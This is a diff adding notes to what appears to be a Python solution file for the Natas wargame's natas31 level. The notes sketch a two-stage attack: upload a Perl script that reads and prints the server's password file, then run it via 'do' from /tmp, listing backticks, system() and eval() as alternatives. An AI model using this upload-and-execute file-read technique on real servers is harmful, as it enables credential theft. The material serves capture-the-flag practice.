@@ -28,6 +28,24 @@ Therefore (I think) this attack needs to happen in 2 stages...
 2. Upload another file that runs our malicious upload
 --> Let the return be nicely printed in table format
 
+**1**
+# read_file.pl
+# This perl script wil read the natas password file into memory and print it as a string
+my $file = "/etc/natas_webpass/natas31";
+my $document = do {
+    local $/ = undef;
+    open my $fh, "<", $file
+        or die "could not open $file: $!";
+    <$fh>;
+};
+print $document;
+
+**2**
+# This is going to be a little harder :)
+# We need to know the exact location fo the file on the server
+# We might need to add this to a dsv to be able to print this?
+# do || `` || system() || eval() --- All let us run other perl scripts
+do '/tmp/read_file.pl';
 """
 
 def natas31(url):
